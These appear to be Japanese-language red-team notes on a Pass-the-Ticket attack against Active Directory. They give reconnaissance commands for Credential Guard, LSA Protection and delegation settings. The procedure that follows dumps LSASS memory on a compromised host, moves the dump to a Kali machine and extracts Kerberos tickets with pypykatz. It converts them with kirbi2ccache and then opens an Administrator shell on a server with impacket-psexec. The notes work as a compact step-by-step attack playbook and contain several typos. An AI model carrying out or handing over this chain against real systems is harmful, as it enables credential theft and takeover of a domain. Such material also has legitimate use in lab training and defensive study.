# Pass The Ticket

## 調査

- Creadential Guardの有無
認証情報が仮想化によってホストOSから隔離された保護環境で保護されている。

``` powershell
    Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root¥Microsoft¥Windows¥DeviceGuard
```

VirtualizationBasedSecurityStatusが　2　になっている場合はCreadential Guardされている。

- LSA Protectionの有無
未署名またはMicrosoft以外で署名されたプロセスからメモリ上の認証情報を保護する。

``` powershell
    Get-ChildItem -LiteralPath 'HKLM:¥SYSTEM¥CurrentControlSet¥Control¥Lsa'
```

RunAsPPLに　1　が設定されていればLSA Protectionが有効

- TRUSTED_FOR_DELEGATION がTRUE
- NOT_DELEGATEDがsetされていない。

``` powershell
    Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

## 手順

管理者権限が必要

- 侵入咲で実行
  - Local Security Autehntication Processのdumpファイルの生成
  - zipでの圧縮 鍵付き
  - dmpファイルの転送
- kali(C3で実行)
  - 解凍
  - ケルベロスチケットの抽出
    - pypykatzを使用

        ``` shell
            # pypykatz lsa -k <抽出先ディレクトリ> minidump <ダンプファイル>
            pypykatz lsa -k ./ minidump ./lsass.DMP
        ```

    administaratorのチケットが抽出できる。
  - kirbi2ccasheを使用してKIRBI形式からccache形式に変換

    ``` shell
        kirbi2ccache <AdministraotrのTGTチケットファイル名> Administrator.ccache
        #コマンドのpathが通ってない場合　/usr/bin/mimikerberos-kirbi2cache
    ```

  - Windowsサーバーのシェルの取得

    ``` shell
        # 環境変数 KRB5CCNAMEにチケットファイルのpathを設定
        # impacket-psexecでケルベロス認証の際に設定したチケットを使用する。
        export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip <Windows Server IP address> -target-ip <Windows Server IP address> -no-pass -k mihari.com/Administrator@<ad hostname>.mihari.com
        # -dc-ip ADのip
        # -target-ip 侵入先のip
        # -no-pass パスワード認証しない
        # -k ケルベロス認証する
    ```
